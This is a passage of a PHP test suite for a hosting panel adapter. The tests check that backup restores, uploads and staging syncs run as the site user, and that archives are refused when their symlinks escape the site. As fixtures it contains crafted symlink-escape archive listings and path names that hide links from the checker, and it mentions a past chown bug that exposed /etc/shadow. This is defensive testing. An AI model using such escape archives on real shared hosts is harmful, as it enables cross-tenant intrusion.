    expect(tenancyPart($upload[1], 'f_path'))->toBe('/www/.onhost-stage')->and(tenancyPart($upload[1], 'f_name'))->toStartWith('up-');
    $move = collect($shell->commands())->first(fn ($c) => str_contains($c, 'cat >'));
    expect($move)->toContain("su -s /bin/bash 'ohenancyag' -c")->toContain('/www/wwwroot/shop.cz/onhost-restore-ab12cd.tar.gz')->toContain('/www/.onhost-stage/up-');
    expect($shell->ran("rm -f '/www/.onhost-stage/up-"))->toBeTrue();

    $transport->delete('onhost-restore-ab12cd.tar.gz');
    expect(tenancyCalled($calls, 'DeleteFile'))->toBeFalse();
    expect(collect($shell->commands())->first(fn ($c) => str_contains($c, 'rm -f --')))->toContain("su -s /bin/bash 'ohenancyag' -c")->toContain('/www/wwwroot/shop.cz/onhost-restore-ab12cd.tar.gz');
});

it('keeps uploads through the panel on a node nobody closed', function () {
    $calls = [];
    tenancyPanelFake($calls);
    AaPanelWebProvider::$shellFactory = fn () => new ScriptedShell;
    $local = tempnam(sys_get_temp_dir(), 'tenancy');
    file_put_contents($local, 'x');

    try {
        aaToolsAdapter()->transport(tenancySite())->upload('index.php', $local);
    } finally {
        @unlink($local);
    }
    expect(tenancyPart(collect($calls)->first(fn ($c) => str_contains($c[0], 'action=upload'))[1], 'f_path'))->toBe('/www/wwwroot/shop.cz');
});

it('closes git deploy and staging on a closed node: both write as root inside the site', function () {
    $calls = [];
    tenancyPanelFake($calls);
    AaPanelWebProvider::$shellFactory = fn () => new ScriptedShell;
    $adapter = aaToolsAdapter();
    tenancySetClosed(true);

    expect($adapter->siteFeatures())->toMatchArray(['deploy' => false, 'staging' => false, 'backups' => true, 'restore' => true]);
    expect($adapter->probes(tenancySite())['files_api'])->toStartWith('skipped');
    expect(tenancyCalled($calls, 'GetDir'))->toBeFalse();
});

it('hands a staging copy on the same node to the site user with chown -h from inside each folder, never through a planted link', function () {
    Http::fake(fn () => Http::response(['status' => true, 'msg' => 'ok', 'data' => [], 'page' => '']));
    $shell = new ScriptedShell(['/^id -u /' => "1042\n", '/^test -e /' => [1, '']]);
    AaPanelWebProvider::$shellFactory = fn () => $shell;
    [, $org] = $this->customerWithOrganization();
    $production = featureWebService($org, 'aapanel');
    $staging = $production->replicate();
    $staging->forceFill(['hostname' => 'shop-staging.web.onhost.cz', 'name_prefix' => null, 'desired_spec' => array_merge((array) $production->desired_spec, ['domain' => 'shop-staging.web.onhost.cz', 'staging_of' => $production->id])])->save();
    ProviderBinding::query()->create(['service_id' => $staging->id, 'provider_instance_id' => $production->provider_instance_id, 'remote_type' => 'site', 'remote_id' => '42', 'remote_node' => 'aapanel-managed01',
        'meta' => ['name' => 'shop-staging.web.onhost.cz', 'path' => '/www/wwwroot/shop-staging.web.onhost.cz'], 'ownership' => ['managed_by' => 'onhost'], 'idempotency_key' => 'tenancy-staging:'.$staging->id, 'adapter_version' => '1.0.0']);
    $link = StagingLink::query()->create(['service_id' => $production->id, 'staging_service_id' => $staging->id, 'organization_id' => $org->id, 'staging_domain' => 'shop-staging.web.onhost.cz', 'state' => 'ready', 'databases' => [], 'meta' => []]);

    app(StagingService::class)->sync($production, $staging, $link, false, CommandContext::system('test'));

    $sync = collect($shell->commands())->first(fn ($c) => str_contains($c, 'rsync -a --delete'));
    // rsync copies production's links as links; a chown that dereferences them handed /etc/shadow to the site user
    expect($sync)->toContain('-execdir chown -h ')->not->toContain('-exec chown ');
});

it('keeps a closure an operator committed while a staff edit was in flight (lost update)', function () {
    aaToolsAdapter();
    $instance = ProviderInstance::query()->where('key', 'aapanel-managed01')->firstOrFail();
    $done = false;
    // the staff edit reads the row, then `--apply` commits the closure before the edit writes (simulated at that read)
    DB::listen(function ($query) use (&$done, $instance) {
        if (! $done && str_starts_with($query->sql, 'select * from "provider_instances" where "key" = ?')) {
            $done = true;
            DB::table('provider_instances')->where('id', $instance->id)->update(['options' => json_encode(array_merge((array) $instance->options, ['tenancy' => ['closed' => true]]))]);
        }
    });

    app(ProviderInstanceService::class)->upsert(['key' => $instance->key, 'provider' => 'aapanel', 'base_url' => $instance->base_url, 'options' => ['verify_tls' => false]], CommandContext::system('staff edit'));

    expect($done)->toBeTrue();
    expect($instance->fresh()->option('tenancy.closed'))->toBeTrue()->and($instance->fresh()->option('verify_tls'))->toBeFalse();
});

it('writes a closure once when two --apply runs overlap', function () {
    Http::fake(fn () => Http::response(['status' => true, 'msg' => 'ok']));
    [, $orgA] = $this->customerWithOrganization();
    [, $orgB] = $this->customerWithOrganization(['email' => 'second@example.test']);
    $first = featureWebService($orgA, 'aapanel');
    tenancyNeighbour($first, $orgB->id, 'other.cz');
    $instance = ProviderInstance::query()->where('key', 'aapanel-managed01')->firstOrFail();
    $done = false;
    // this run saw the node open; the other run closes it before this one writes
    DB::listen(function ($query) use (&$done, $instance) {
        if (! $done && str_starts_with($query->sql, 'select "options" from "provider_instances"')) {
            $done = true;
            DB::table('provider_instances')->where('id', $instance->id)->update(['options' => json_encode(array_merge((array) $instance->options, ['tenancy' => ['closed' => true, 'by' => 'the other run']]))]);
        }
    });
    $writes = DB::table('audit_events')->where('action', 'provisioning.instance.upsert')->count();

    $this->artisan('operator:aapanel:tenancy --apply')->expectsOutputToContain('already closed')->assertExitCode(0);

    expect($done)->toBeTrue();
    expect(DB::table('audit_events')->where('action', 'provisioning.instance.upsert')->count())->toBe($writes);
    expect($instance->fresh()->option('tenancy.by'))->toBe('the other run');
});

it('closes nothing when the node has dropped to one organization between the dry run and --apply', function () {
    Http::fake(fn () => Http::response(['status' => true, 'msg' => 'ok']));
    [, $orgA] = $this->customerWithOrganization();
    [, $orgB] = $this->customerWithOrganization(['email' => 'second@example.test']);
    $first = featureWebService($orgA, 'aapanel');
    $second = tenancyNeighbour($first, $orgB->id, 'other.cz');
    $this->artisan('operator:aapanel:tenancy')->expectsOutputToContain('other.cz')->assertExitCode(0);

    $second->forceFill(['state' => ServiceStateMachine::TERMINATED, 'terminated_at' => now()])->save();

    $this->artisan('operator:aapanel:tenancy --apply')->expectsOutputToContain('Nothing to close')->assertExitCode(0);
    expect(ProviderInstance::query()->where('key', 'aapanel-managed01')->first()->option('tenancy.closed'))->toBeNull();
});

// ── review round 3 (TASK-0034): no root tar unpacks an archive, and an archive's links are judged together ─────

/** The panel's backup list, answering one backup file. */
function tenancyBackupList(string $file): array
{
    return ['data?action=getData&table=backup' => ['data' => [['id' => 77, 'addtime' => '2026-09-10 02:30:00', 'size' => 1234, 'filename' => $file]]]];
}

/**
 * The site user's own script when `$command` is nothing but `su <user> -c '<script>' < <archive>` (root hands the archive
 * over on stdin and does nothing else); null for any other command.
 */
function tenancyUserScript(string $command, string $user = 'ohenancyag'): ?string
{
    if (! preg_match("~^su -s /bin/bash '".preg_quote($user, '~')."' -c '((?:[^']|'\\\\'')*)' < '[^']+'$~s", $command, $m)) {
        return null;
    }

    return str_replace("'\\''", "'", $m[1]);
}

/** Every command in which root itself (not the site user behind `su … -c`) runs `tar -x`. */
function tenancyRootTarUnpacks(ScriptedShell $shell): array
{
    return collect($shell->commands())
        ->filter(fn ($c) => tenancyUserScript($c) === null && preg_match('/\btar\b[^;&|]*\s-x/', explode(' su -s /bin/bash ', $c, 2)[0]) === 1)
        ->values()->all();
}

it('refuses a .tar.gz restore on a node nobody closed rather than unpacking it with a root tar (as before the task, now with the reason)', function () {
    $calls = [];
    tenancyPanelFake($calls, tenancyBackupList('/www/backup/site/shop.cz_20260910.tar.gz'));
    $shell = tenancyTarShell("N 2 2\nT - 1\nT d 1\n");
    AaPanelWebProvider::$shellFactory = fn () => $shell;
    $adapter = aaToolsAdapter();

    expect(fn () => $adapter->restoreFromArchive(tenancySite(), '77'))->toThrow(ProviderException::class, 'closed as shared');
    expect(tenancyRootTarUnpacks($shell))->toBe([])->and($shell->ran('-xzf'))->toBeFalse()->and($shell->ran('rsync'))->toBeFalse()
        ->and($shell->ran('chown'))->toBeFalse();
});

it('restores a .tar.gz backup on a closed node entirely as the site user: unpacked into a fresh folder, then moved in', function () {
    $calls = [];
    tenancyPanelFake($calls, tenancyBackupList('/www/backup/site/shop.cz_20260910.tar.gz'));
    $shell = tenancyTarShell("N 2 2\nT - 1\nT d 1\nF 2\n");
    AaPanelWebProvider::$shellFactory = fn () => $shell;
    $adapter = aaToolsAdapter();
    tenancySetClosed(true);

    $adapter->restoreFromArchive(tenancySite(), '77');

    expect(tenancyRootTarUnpacks($shell))->toBe([]); // root never runs tar -x, not even into its own folder
    $command = collect($shell->commands())->first(fn ($c) => tenancyUserScript($c) !== null);
    expect($command)->not->toBeNull()->toEndWith("< '/www/backup/site/shop.cz_20260910.tar.gz'");
    $script = tenancyUserScript($command);
    expect($script)->toContain("mktemp -d '/www/wwwroot/shop.cz/.onhost-unpack.")->toContain('trap \'rm -rf -- "$D"\' EXIT')
        ->toContain('tar --force-local -xzf - -C "$D/x" --no-same-owner --no-same-permissions --no-overwrite-dir')
        ->toContain('if [ -d "$src"/\'shop.cz\' ] && [ ! -L "$src"/\'shop.cz\' ]; then')
        ->toContain("tar -C \"\$src\" -cf - --exclude=./.user.ini . | tar -C '/www/wwwroot/shop.cz' -xf - --no-same-owner --no-same-permissions --no-overwrite-dir")
        ->not->toContain('chown')->not->toContain('chmod')->not->toContain('rsync');
    expect($shell->ran('/www/.onhost-stage/restore-'))->toBeFalse();
});

dataset('archives unpacked on a closed node', [
    'tar.gz' => ['onhost-restore-ab12cd.tar.gz', 'tar --force-local -xzf - -C "$D/x" --no-same-owner --no-same-permissions --no-overwrite-dir'],
    'zip' => ['onhost-restore-ab12cd.zip', 'cat > "$D/a.zip"; unzip -q "$D/a.zip" -d "$D/x"'],
]);

it('unpacks an archive on a closed node entirely as the site user, from the root-only copy it was judged as', function (string $archive, string $unpack) {
    $calls = [];
    tenancyPanelFake($calls);
    $shell = tenancyTarShell("N 2 2\nT - 1\nT d 1\n");
    AaPanelWebProvider::$shellFactory = fn () => $shell;
    $adapter = aaToolsAdapter();
    tenancySetClosed(true);

    $adapter->transport(tenancySite())->extract($archive, 'restore');

    expect(tenancyCalled($calls, 'UnZip'))->toBeFalse()->and(tenancyRootTarUnpacks($shell))->toBe([])->and($shell->ran('unzip -oq'))->toBeFalse();
    $command = collect($shell->commands())->first(fn ($c) => tenancyUserScript($c) !== null);
    expect($command)->not->toBeNull()->toMatch("~< '/www/\\.onhost-stage/stage-[0-9a-f]{12}\\.(tar\\.gz|zip)'$~");
    expect(tenancyUserScript($command))->toContain("mktemp -d '/www/wwwroot/shop.cz/.onhost-unpack.")->toContain($unpack)
        ->toContain("mkdir -p -- '/www/wwwroot/shop.cz/restore'")
        ->toContain("tar -C \"\$src\" -cf - . | tar -C '/www/wwwroot/shop.cz/restore' -xf - --no-same-owner --no-same-permissions --no-overwrite-dir")
        ->not->toContain('.user.ini'); // a subfolder: the root .user.ini is not in the way
    expect($shell->ran("rm -f '/www/.onhost-stage/stage-"))->toBeTrue();
})->with('archives unpacked on a closed node');

dataset('links that escape through another link of the same archive', [
    'y -> . and x -> y/../other.cz' => ["N 2 2\nT l 2\nL y\t.\nL x\ty/../other.cz\n"],
    'y -> the site root (absolute) and x -> y/../other.cz' => ["N 2 2\nT l 2\nL y\t/www/wwwroot/shop.cz\nL x\ty/../other.cz\n"],
    'a/up -> .. and b -> a/up/../other.cz' => ["N 3 3\nT d 1\nT l 2\nL a/up\t..\nL b\ta/up/../other.cz\n"],
    'links that point at each other (a loop)' => ["N 2 2\nT l 2\nL a\tb\nL b\ta\n"],
    'a link the listing had to escape' => ["N 1 1\nT l 1\nL x\tfoo\\\\bar\n"],
]);

it('judges a link together with the other links of its archive, not on its own', function (string $report) {
    $calls = [];
    tenancyPanelFake($calls);
    AaPanelWebProvider::$shellFactory = fn () => tenancyTarShell($report);
    $adapter = aaToolsAdapter();

    expect(fn () => $adapter->transport(tenancySite())->extract('site.tar.gz', '.'))->toThrow(ProviderException::class, 'The archive was not unpacked');
    expect(tenancyCalled($calls, 'UnZip'))->toBeFalse();
})->with('links that escape through another link of the same archive');

it('keeps links that stay in the site through each other (a release switch and a web root inside it)', function () {
    $calls = [];
    tenancyPanelFake($calls);
    AaPanelWebProvider::$shellFactory = fn () => tenancyTarShell("N 5 5\nT d 2\nT l 3\nL current\treleases/2\nL web\tcurrent/public\nL public/storage\t/www/wwwroot/shop.cz/storage/app/public\n");
    $adapter = aaToolsAdapter();

    $adapter->transport(tenancySite())->extract('site.tar.gz', '.');

    expect(tenancyCalled($calls, 'UnZip'))->toBeTrue();
});

it('judges the links of a backup where they land after the restore, its site folder moved up into the site', function () {
    $calls = [];
    tenancyPanelFake($calls, tenancyBackupList('/www/backup/site/shop.cz_20260910.tar.gz'));
    $shell = tenancyTarShell("N 3 3\nT d 1\nT - 1\nT l 1\nF 2\nL shop.cz/up\t../other.cz\n");
    AaPanelWebProvider::$shellFactory = fn () => $shell;
    $adapter = aaToolsAdapter();
    tenancySetClosed(true);

    // `shop.cz/up -> ../other.cz` stays inside the folder it is unpacked into, but not inside the site it is moved into
    expect(fn () => $adapter->restoreFromArchive(tenancySite(), '77'))->toThrow(ProviderException::class, 'a symlink points outside the site');
    expect(collect($shell->commands())->first(fn ($c) => tenancyUserScript($c) !== null))->toBeNull();
});

it('restores a backup whose links stay in the site once its site folder is moved up (and one without that folder)', function (string $report) {
    $calls = [];
    tenancyPanelFake($calls, tenancyBackupList('/www/backup/site/shop.cz_20260910.tar.gz'));
    $shell = tenancyTarShell($report);
    AaPanelWebProvider::$shellFactory = fn () => $shell;
    $adapter = aaToolsAdapter();
    tenancySetClosed(true);

    $adapter->restoreFromArchive(tenancySite(), '77');

    expect(collect($shell->commands())->first(fn ($c) => tenancyUserScript($c) !== null))->not->toBeNull();
})->with([
    'with the site folder' => ["N 4 4\nT d 1\nT - 1\nT l 2\nF 3\nL shop.cz/current\treleases/1\nL shop.cz/public/storage\t/www/wwwroot/shop.cz/storage/app/public\n"],
    'without it' => ["N 3 3\nT d 1\nT l 2\nF 0\nL current\treleases/1\nL public/storage\t/www/wwwroot/shop.cz/storage/app/public\n"],
]);

// ── review round 4 (TASK-0034): a name with a `.` or empty part hides a link from the judge ────────────────────────

dataset('names with a "." or empty part that hide a link from the judge', [
    // `q/./y` lands as `q/y`: judged under its written name, `x` never hopped through it and was taken for a name inside
    'q/./y -> .. and x -> q/y/../other.cz' => ["N 3 3\nT d 1\nT l 2\nL q/./y\t..\nL x\tq/y/../other.cz\n"],
    'q//y -> .. and x -> q/y/../other.cz' => ["N 3 3\nT d 1\nT l 2\nL q//y\t..\nL x\tq/y/../other.cz\n"],
    'a trailing /. on the name of a link' => ["N 3 3\nT d 1\nT l 2\nL q/y/.\t..\nL x\tq/y/../other.cz\n"],
    'more than one leading ./' => ["N 2 2\nT l 2\nL ././y\t..\nL x\ty/../other.cz\n"],
    'the node found such a name (an entry beneath a link named p/./x)' => ["N 3 3\nT d 1\nT - 1\nT l 1\nL p/./x\t.\nD p/./x\n"],
]);

it('refuses an archive whose entry names carry a "." or empty part, on the node and again in PHP', function (string $report) {
    $calls = [];
    tenancyPanelFake($calls);
    AaPanelWebProvider::$shellFactory = fn () => tenancyTarShell($report);
    $adapter = aaToolsAdapter();

    expect(fn () => $adapter->transport(tenancySite())->extract('site.tar.gz', '.'))->toThrow(ProviderException::class, 'The archive was not unpacked');
    expect(tenancyCalled($calls, 'UnZip'))->toBeFalse();
})->with('names with a "." or empty part that hide a link from the judge');

it('refuses a backup whose link named .//<site> would let the whole archive move in, its top-level links never judged', function () {
    $calls = [];
    tenancyPanelFake($calls, tenancyBackupList('/www/backup/site/shop.cz_20260910.tar.gz'));
    // the shell sees `shop.cz` as a link and moves the whole archive in; PHP read the key `/shop.cz` and judged only `shop.cz/…`
    $shell = tenancyTarShell("N 4 4\nT d 1\nT - 1\nT l 2\nF 2\nL .//shop.cz\t.\nL up\t../other.cz\n");
    AaPanelWebProvider::$shellFactory = fn () => $shell;
    $adapter = aaToolsAdapter();
    tenancySetClosed(true);

    expect(fn () => $adapter->restoreFromArchive(tenancySite(), '77'))->toThrow(ProviderException::class, 'The archive was not unpacked');
    expect(collect($shell->commands())->first(fn ($c) => tenancyUserScript($c) !== null))->toBeNull();
});

it('asks the node to report every entry name with a "." or empty part, for tar and zip alike', function (string $archive) {
    $calls = [];
    tenancyPanelFake($calls);
    $shell = tenancyTarShell("N 2 2\nT - 1\nT d 1\n");
    AaPanelWebProvider::$shellFactory = fn () => $shell;
    $adapter = aaToolsAdapter();

    $adapter->transport(tenancySite())->extract($archive, '.');

    $listing = collect($shell->commands())->first(fn ($c) => str_contains($c, '-tzvf') || str_contains($c, 'unzip -Zs'));
    expect($listing)->toContain('print "D " $0');
})->with(['site.tar.gz', 'site.zip']);

it('still accepts the names a site archive really carries: ./, ./name, folder/ and dot files', function () {
    $calls = [];
    tenancyPanelFake($calls);
    AaPanelWebProvider::$shellFactory = fn () => tenancyTarShell("N 6 6\nT d 3\nT - 1\nT l 2\nL ./current\treleases/2\nL ./public/.well-known\t../.well-known\n");
    $adapter = aaToolsAdapter();

    $adapter->transport(tenancySite())->extract('site.tar.gz', '.');

    expect(tenancyCalled($calls, 'UnZip'))->toBeTrue();
});
